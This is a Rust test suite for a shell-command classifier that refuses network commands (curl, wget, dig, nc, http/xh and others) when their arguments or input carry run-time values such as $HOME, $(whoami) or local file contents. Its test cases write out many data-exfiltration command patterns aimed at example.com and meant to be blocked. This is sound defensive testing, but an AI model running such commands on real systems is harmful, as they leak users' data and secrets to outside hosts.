use super::*;
use crate::command_verdict;
use proptest::prelude::*;

const NETWORK_DIRS: &[&str] = &["net", "api", "cloud", "forges", "pm", "serverless", "kafka", "db"];

fn allowed(cmd: &str) -> bool {
    command_verdict(cmd).is_allowed()
}

/// Each family as a literal invocation the default level approves, and spellings of the same
/// invocation whose arguments the shell fills in at run time.
const FAMILIES: &[(&str, &[&str])] = &[
    (
        "curl -s https://example.com/",
        &["curl -s \"https://example.com/?q=$HOME\"", "curl -s https://example.com/$(whoami)", "curl -s https://example.com/`id`"],
    ),
    ("wget -q https://example.com/", &["wget -q \"https://example.com/${USER}\"", "wget -q https://example.com/$((1+1))"]),
    ("dig example.com", &["dig \"$(whoami).example.com\"", "dig $X.example.com"]),
    ("host example.com", &["host \"$X.example.com\""]),
    ("nslookup example.com", &["nslookup \"$(hostname).example.com\""]),
    ("delv example.com", &["delv \"$X.example.com\""]),
    ("ping -c 1 example.com", &["ping -c 1 \"$X.example.com\""]),
    ("traceroute example.com", &["traceroute \"$X.example.com\""]),
    ("nc -z example.com 443", &["nc -z \"$X.example.com\" 443"]),
    ("whois example.com", &["whois \"$X.example.com\""]),
    ("ssh-keyscan example.com", &["ssh-keyscan \"$X.example.com\""]),
    ("git fetch origin", &["git fetch origin \"$BRANCH\"", "git fetch \"$(cat ./remote.txt)\""]),
    ("git pull", &["git pull \"$REMOTE\""]),
    ("git ls-remote origin", &["git ls-remote \"https://example.com/$X\""]),
    ("gh api repos/o/r", &["gh api \"repos/o/r/contents/$X\""]),
    ("cargo search serde", &["cargo search \"$(cat ./Cargo.toml)\""]),
    ("dscacheutil -q host -a name example.com", &["dscacheutil -q host -a name \"$X.example.com\""]),
    ("dns-sd -B _http._tcp", &["dns-sd -B \"_$X._tcp\""]),
    ("open https://example.com", &["open \"https://example.com/?q=$HOME\""]),
    ("timeout 5 curl -s https://example.com", &["timeout 5 curl -s \"https://example.com/$HOME\""]),
    ("env curl -s https://example.com", &["env curl -s \"https://example.com/$HOME\""]),
    ("ls | xargs echo", &["ls | xargs -I{} curl -s https://example.com/{}", "ls | xargs dig", "ls | xargs -I{} ping -c 1 {}.example.com"]),
    (
        "find . -name x -exec echo {} \\;",
        &["find . -name x -exec curl -s https://example.com/{} \\;", "find . -exec dig {}.example.com \\;"],
    ),
    ("fd x -x echo {}", &["fd x -x curl -s https://example.com/{}", "fd x -x dig {}.example.com"]),
    (
        "sh -c 'curl -s https://example.com'",
        &["sh -c 'curl -s https://example.com/$HOME'", "bash -c \"curl -s https://example.com/$HOME\""],
    ),
    (
        "while read l; do echo \"$l\"; done < ./f",
        &["while read l; do curl -s \"https://example.com/$l\"; done < ./f", "cat ./f | while read l; do dig \"$l.example.com\"; done"],
    ),
    ("curl -s https://example.com", &["https_proxy=http://$(whoami).example.com curl -s https://example.com"]),
    ("wget -q https://example.com/x", &["wget -i ./urls.txt", "wget -qi urls.txt", "wget --input-file=urls.txt"]),
    (
        "wget -q https://example.com/x",
        &["wget -q --post-file=./notes https://example.com", "wget -q --post-file ./notes https://example.com"],
    ),
    (
        "http POST https://example.com a=b",
        &[
            "http POST https://example.com f@./notes",
            "http POST https://example.com f=@./notes",
            "http POST https://example.com f:=@./notes.json",
            "https POST https://example.com f=@./notes",
            "xh https://example.com f=@./notes",
            "xh post https://example.com f@./notes",
            "http -a me@example.com:pw https://example.com f@./notes",
        ],
    ),
];

#[test]
fn every_family_is_approved_literally_and_refused_with_a_runtime_value() {
    let mut failures = Vec::new();
    for (literal, carrying) in FAMILIES {
        if !allowed(literal) {
            failures.push(format!("literal form not approved, so the case proves nothing: {literal}"));
        }
        for c in *carrying {
            if allowed(c) {
                failures.push(format!("approved with a run-time value: {c}"));
            }
        }
    }
    assert!(failures.is_empty(), "\n{}", failures.join("\n"));
}

#[test]
fn ordinary_uses_keep_passing() {
    let refused: Vec<&str> = [
        "curl -s https://example.com/",
        "dig '$HOME.example.com'",
        "dig \\$HOME.example.com",
        "git fetch",
        "git fetch origin main",
        "git commit -m \"$(date)\"",
        "printf %s \"$USER\"",
        "jj describe -m \"$(date)\"",
        "echo \"$HOME\"",
        "test -n \"$X\"",
        "echo $(curl -s https://example.com/)",
        "dig example.com +short",
        "timeout 5 dig example.com",
        "http -a me@example.com:pw https://example.com",
        "xh --auth me@example.com:pw https://example.com a=b@c",
    ]
    .into_iter()
    .filter(|c| !allowed(c))
    .collect();
    assert!(refused.is_empty(), "should still be approved: {refused:?}");
}

#[test]
fn a_loop_over_literal_text_passes_and_anything_else_does_not() {
    let literal = [
        "for h in a.example.com b.example.com; do dig \"$h\"; done",
        "for h in a b; do dig ${h}.example.com +short; done",
        "for f in a.rs b.rs; do echo \"== $f ==\"; gh api repos/o/r/contents/$f --jq .content | base64 -d; done",
    ];
    let refused: Vec<&str> = literal.into_iter().filter(|c| !allowed(c)).collect();
    assert!(refused.is_empty(), "a literal loop list carries nothing: {refused:?}");
    let carrying = [
        "for f in *; do dig \"$f.example.com\"; done",
        "for f in ~/x; do dig \"$f.example.com\"; done",
        "for f in $(whoami); do dig \"$f.example.com\"; done",
        "for f in \"$USER\"; do dig \"$f.example.com\"; done",
        "for f in a; do f=$(whoami); dig \"$f.example.com\"; done",
        "for f in a; do read f < ./x; dig \"$f.example.com\"; done",
        "for f in a; do declare \"$n=$(whoami)\"; dig \"$f.example.com\"; done",
        "for f in a; do printf -v f %s \"$USER\"; dig \"$f.example.com\"; done",
        "for f in a; do echo ${f:=x}; dig \"$f.example.com\"; done",
        "g(){ f=$(whoami); }; for f in a; do g; dig \"$f.example.com\"; done",
        "for f in a; do for f in $(whoami); do dig \"$f.example.com\"; done; done",
        "for f in a; do dig \"${!f}.example.com\"; done",
        "for f in a; do dig \"${f%x}.example.com\"; done",
        "for f in a; do :; done; dig \"$f.example.com\"",
        "for f in a; do dig \"$g.example.com\"; done",
    ];
    let approved: Vec<&str> = carrying.into_iter().filter(|c| allowed(c)).collect();
    assert!(approved.is_empty(), "approved with a run-time value: {approved:?}");
}

fn parsed_simple(cmd: &str) -> crate::cst::SimpleCmd {
    let script = crate::cst::parse(cmd).expect("parses");
    let crate::cst::Cmd::Simple(simple) = script.0[0].pipeline.commands[0].clone() else { panic!("not a simple command: {cmd}") };
    simple
}

#[test]
fn what_counts_as_carrying() {
    for cmd in [
        "x \"$1\"", "x $@", "x ${X:-y}", "x ${#X}", "x $'a'", "x a$", "x $(id)", "x `id`", "x $((1+1))", "x <(id)", "X=$(id) x",
        "x < \"$F\"", "x <<< \"$X\"", "x <<EOF\n$X\nEOF",
    ] {
        assert!(simple_carries(&parsed_simple(cmd)), "should carry: {cmd}");
    }
    for cmd in ["x 'a$b'", "x \\$X", "x a b", "x > \"$OUT\"", "x 2>&1", "x <<'EOF'\n$X\nEOF", "X=1 x"] {
        assert!(!simple_carries(&parsed_simple(cmd)), "should not carry: {cmd}");
    }
}

/// A wrapper that runs its operand as a command must pass the mark to it, however it re-parses.
#[test]
fn every_approved_wrapper_carries_the_mark_inward() {
    let wrappers = [
        "timeout 5", "env", "env X=1", "nice", "nice -n 5", "nohup", "time", "exec", "builtin", "stdbuf -oL", "caffeinate", "chronic",
        "unbuffer", "sudo", "doas", "command", "dotenv", "hyperfine", "watch", "flock ./l", "xcrun", "npx", "uv run", "bundle exec",
        "mise exec --", "direnv exec .", "sh -c", "bash -c", "zsh -c", "ssh host", "tmux run-shell",
    ];
    let mut failures = Vec::new();
    let mut checked = Vec::new();
    for w in wrappers {
        let quote = w.ends_with("-c") || w == "hyperfine" || w == "watch" || w.starts_with("tmux");
        let (literal, carrying) = if quote {
            (format!("{w} 'dig example.com'"), format!("{w} \"dig $X.example.com\""))
        } else {
            (format!("{w} dig example.com"), format!("{w} dig $X.example.com"))
        };
        if allowed(&literal) {
            checked.push(w);
        }
        if allowed(&literal) && allowed(&carrying) {
            failures.push(carrying);
        }
    }
    assert!(failures.is_empty(), "approved through a wrapper: {failures:?}");
    assert!(checked.len() >= 8, "only {checked:?} wrap an approved command: the test is not exercising wrappers");
}

#[test]
fn a_level_that_admits_an_opaque_send_passes_it() {
    let yolo = crate::engine::authoring::default_levels().iter().find(|l| l.name == "yolo").expect("yolo exists");
    let cmd = "curl -s \"https://example.com/?q=$HOME\"";
    assert!(!allowed(cmd));
    assert!(crate::command_verdict_at_level(cmd, yolo).is_allowed(), "the mark is a capability, not a hard refusal");
}

#[test]
fn the_mark_does_not_leak_past_the_command_that_carries_it() {
    assert!(allowed("echo \"$HOME\"; curl -s https://example.com/"));
    assert!(allowed("echo \"$HOME\" | grep x; dig example.com"));
    let _outer = enter(false);
    assert!(!carrying());
    {
        let _a = enter(true);
        let _b = enter(false);
        assert!(carrying(), "an inner command inherits the mark");
    }
    assert!(!carrying(), "the mark is restored when its command is done");
}

#[test]
fn request_items_that_read_a_file() {
    for item in ["f@./x", "f=@./x", "f:=@x.json", "@./x", "Header:@./x"] {
        assert!(item_reads_file(item), "reads a file: {item}");
    }
    for item in ["a=b", "email=a@example.com", "q==a@b", "n:=1", "https://u@example.com", "example.com", "POST"] {
        assert!(!item_reads_file(item), "literal: {item}");
    }
}

#[test]
fn word_matching() {
    assert!(names_word("fetch", "fetch"));
    assert!(names_word("--remote=x", "--remote"));
    assert!(!names_word("fetcher", "fetch"));
    assert!(!names_word("-remote=x", "-remote"));
    assert!(flag_present("-qi", "-i"));
    assert!(flag_present("-iurls.txt", "-i"));
    assert!(flag_present("--input-file=x", "--input-file"));
    assert!(!flag_present("--quiet", "-i"));
    assert!(!flag_present("-O-", "-i"));
    assert!(!flag_present("-q", "-i"));
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct FullList {
    commands: HashSet<String>,
    local: HashSet<String>,
    request_item_files: HashMap<String, Vec<String>>,
    file_inputs: HashMap<String, Vec<String>>,
    subcommands: HashMap<String, Vec<String>>,
}

#[derive(Deserialize)]
struct CommandFile {
    #[serde(default)]
    command: Vec<CommandEntry>,
}

#[derive(Deserialize)]
struct CommandEntry {
    name: String,
}

fn directory_commands() -> Vec<(String, String)> {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
    let mut out = Vec::new();
    for dir in NETWORK_DIRS {
        let entries = std::fs::read_dir(root.join(dir)).unwrap_or_else(|e| panic!("commands/{dir}: {e}"));
        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().is_none_or(|e| e != "toml") {
                continue;
            }
            let text = std::fs::read_to_string(&path).unwrap_or_else(|e| panic!("{}: {e}", path.display()));
            let file: CommandFile = toml::from_str(&text).unwrap_or_else(|e| panic!("{}: {e}", path.display()));
            out.extend(file.command.into_iter().map(|c| (c.name, path.display().to_string())));
        }
    }
    out
}

#[test]
fn every_command_in_a_network_directory_is_classified() {
    let list: FullList = toml::from_str(include_str!("../../network.toml")).expect("network.toml is valid");
    let found = directory_commands();
    assert!(found.len() > 150, "only {} commands found: the walk is broken, not the list", found.len());
    let unclassified: Vec<String> = found
        .iter()
        .filter(|(name, _)| !list.commands.contains(name) && !list.local.contains(name) && !list.subcommands.contains_key(name))
        .map(|(name, path)| format!("{name} ({path})"))
        .collect();
    assert!(unclassified.is_empty(), "add each to `commands`, [subcommands] or `local` in network.toml:\n{}", unclassified.join("\n"));
    let names: HashSet<&str> = found.iter().map(|(n, _)| n.as_str()).collect();
    let stale: Vec<&String> = list.local.iter().filter(|n| !names.contains(n.as_str())).collect();
    assert!(stale.is_empty(), "`local` names commands outside the network directories: {stale:?}");
    let both: Vec<&String> = list
        .local
        .iter()
        .filter(|n| list.commands.contains(*n) || list.subcommands.contains_key(*n))
        .collect();
    assert!(both.is_empty(), "classified as both local and network: {both:?}");
    let orphan: Vec<&String> = list.file_inputs.keys().filter(|n| !list.commands.contains(*n)).collect();
    assert!(orphan.is_empty(), "file_inputs for a command not in `commands`: {orphan:?}");
    let orphan_items: Vec<&String> = list.request_item_files.keys().filter(|n| !list.commands.contains(*n)).collect();
    assert!(orphan_items.is_empty(), "request_item_files for a command not in `commands`: {orphan_items:?}");
}

/// Every approved invocation of a network command in the verdict snapshot, as the corpus the
/// properties below inject into. Read from the fixture so a newly researched command is covered
/// the day its examples land.
fn approved_network_invocations() -> Vec<String> {
    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/verdict_snapshot");
    let mut out = Vec::new();
    for entry in std::fs::read_dir(&dir).expect("snapshot dir").flatten() {
        let text = std::fs::read_to_string(entry.path()).expect("snapshot file");
        for line in text.lines() {
            let Some((cmd, verdict)) = line.rsplit_once('\t') else { continue };
            if verdict == "denied" || cmd.contains(['$', '`', '{', '\\', '\'', '"', '|', ';', '&', '<', '>', '(', ')']) {
                continue;
            }
            let tokens: Vec<Token> = cmd.split_whitespace().map(|w| Token::from_raw(w.to_string())).collect();
            if reaches_network(&tokens) && allowed(cmd) {
                out.push(cmd.to_string());
            }
        }
    }
    out.sort();
    out
}

static CORPUS: LazyLock<Vec<String>> = LazyLock::new(approved_network_invocations);

#[test]
fn the_corpus_is_not_empty() {
    assert!(CORPUS.len() > 200, "only {} approved network invocations: the filter is broken", CORPUS.len());
    for family in ["curl ", "dig ", "git fetch", "ping ", "gh api"] {
        assert!(CORPUS.iter().any(|c| c.starts_with(family)), "no {family} invocation in the corpus");
    }
}

fn injection() -> impl Strategy<Value = &'static str> {
    prop::sample::select(vec!["$X", "\"$HOME\"", "${USER}", "$(whoami)", "\"$(id -un)\"", "`id`", "$((1+1))", "$1", "$@", "<(id)"])
}

fn wrapper() -> impl Strategy<Value = &'static str> {
    prop::sample::select(vec!["", "timeout 5 ", "env ", "nice ", "time "])
}

fn still_network(cmd: &str) -> bool {
    let tokens: Vec<Token> = cmd.split_whitespace().map(|w| Token::from_raw(w.to_string())).collect();
    reaches_network(&tokens)
}

fn insert_at(cmd: &str, position: usize, glue: bool, value: &str) -> String {
    let mut words: Vec<String> = cmd.split_whitespace().map(str::to_string).collect();
    let at = 1 + position % words.len();
    if glue && at < words.len() {
        words[at].push_str(value);
    } else {
        words.insert(at.min(words.len()), value.to_string());
    }
    words.join(" ")
}

proptest! {
    #![proptest_config(ProptestConfig::with_cases(512))]

    #[test]
    fn a_network_command_never_approves_an_expanded_argument(
        index in any::<prop::sample::Index>(),
        position in 0usize..16,
        glue in any::<bool>(),
        value in injection(),
        prefix in wrapper(),
    ) {
        let base = index.get(&CORPUS);
        let injected = insert_at(base, position, glue, value);
        prop_assume!(still_network(&injected), "the injection renamed the subcommand");
        let cmd = format!("{prefix}{injected}");
        prop_assert!(!allowed(&cmd), "approved: {cmd}");
    }

    #[test]
    fn a_network_command_never_approves_an_xargs_or_exec_item(
        index in any::<prop::sample::Index>(),
        position in 0usize..16,
        glue in any::<bool>(),
        form in 0usize..3,
    ) {
        let base = index.get(&CORPUS);
        let inner = insert_at(base, position, glue, "{}");
        prop_assume!(still_network(&inner), "the injection renamed the subcommand");
        let cmd = match form {
            0 => format!("ls | xargs -I{{}} {inner}"),
            1 => format!("find . -name x -exec {inner} \\;"),
            _ => format!("fd x -x {inner}"),
        };
        prop_assert!(!allowed(&cmd), "approved: {cmd}");
    }

    #[test]
    fn a_request_item_reads_a_file_only_through_an_at_separator(
        name in "[A-Za-z][A-Za-z0-9_-]{0,8}",
        value in "([A-Za-z0-9./ _-][ -~]{0,12})?",
        sep in prop::sample::select(vec!["=", "==", ":=", ":"]),
    ) {
        prop_assert!(!item_reads_file(&format!("{name}{sep}{value}")), "{}{}{}", name, sep, value);
        let file_sep = if sep == "==" { "@" } else { sep };
        prop_assert!(item_reads_file(&format!("{name}{file_sep}@{value}")), "{}{}@{}", name, file_sep, value);
    }

    #[test]
    fn a_quoted_dollar_never_trips_the_mark(
        index in any::<prop::sample::Index>(),
        quoted in prop::sample::select(vec!["'$HOME'", "\\$HOME", "'$(id)'", "'`id`'"]),
    ) {
        let base = index.get(&CORPUS);
        let tokens: Vec<Token> = base.split_whitespace().map(|w| Token::from_raw(w.to_string())).collect();
        let _clear = enter(false);
        prop_assert_eq!(egress_verdict(&tokens), Verdict::Allowed(SafetyLevel::Inert), "{}", base);
        let script = crate::cst::parse(&format!("{base} {quoted}")).expect("parses");
        let crate::cst::Cmd::Simple(cmd) = &script.0[0].pipeline.commands[0] else { panic!("not a simple command: {base}") };
        prop_assert!(!simple_carries(cmd), "a quoted or escaped dollar is literal: {} {}", base, quoted);
    }
}

#[test]
fn stdin_from_the_machine_counts_and_literal_text_does_not() {
    let carrying = [
        "cat ./notes | http https://example.com",
        "cat ./notes | http GET https://example.com",
        "cat ./notes | xh https://example.com",
        "git log | xh https://example.com",
        "echo \"$HOME\" | http https://example.com",
        "printf '%s' \"$(whoami)\" | http https://example.com",
        "cat ./notes | grpcurl -d @ example.com:443 a.B/C",
        "http https://example.com < ./notes",
        "cat ./notes | (http https://example.com)",
        "{ http https://example.com; } < ./notes",
        "cat ./notes | { http https://example.com; }",
        "cat ./notes | timeout 5 http https://example.com",
        "f(){ http https://example.com; }; f < ./notes",
        "f(){ http https://example.com; }; f <<< \"$HOME\"",
    ];
    let approved: Vec<&str> = carrying.into_iter().filter(|c| allowed(c)).collect();
    assert!(approved.is_empty(), "approved with stdin from the machine: {approved:?}");
    let literal = [
        "http https://example.com", "echo hi | http https://example.com", "printf 'a b' | xh https://example.com",
        "http https://example.com <<< hi", "cat ./notes | grep x", "curl -s https://example.com | grep x",
    ];
    let refused: Vec<&str> = literal.into_iter().filter(|c| !allowed(c)).collect();
    assert!(refused.is_empty(), "literal text on stdin carries nothing: {refused:?}");
}
